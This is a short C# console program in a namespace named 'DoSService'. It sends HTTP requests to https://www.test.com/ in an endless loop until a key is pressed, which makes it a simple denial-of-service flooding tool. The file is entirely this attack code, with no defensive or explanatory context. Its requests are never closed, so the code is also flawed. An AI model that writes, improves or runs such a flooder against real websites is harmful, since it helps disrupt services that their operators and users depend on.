using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks; 
using System.Net;
using System.IO;

namespace DoSService
{
    class Program
    {
        static void Main(string[] args)
        {



           var myWorker = new MyWorker();
            myWorker.DoStuff();
            Console.WriteLine("Press any key to stop...");
            Console.ReadKey(); 
            
        
        }
        
    }
    public class MyWorker
    {

        public void DoStuff()
        {
            string url = "https://www.test.com/";
            while (!Console.KeyAvailable)
            {
                HttpWebRequest request = (HttpWebRequest)WebRequest.Create(url);

                HttpWebResponse response = (HttpWebResponse)request.GetResponse();

                Stream resStream = response.GetResponseStream();

            }
        }
    }
}
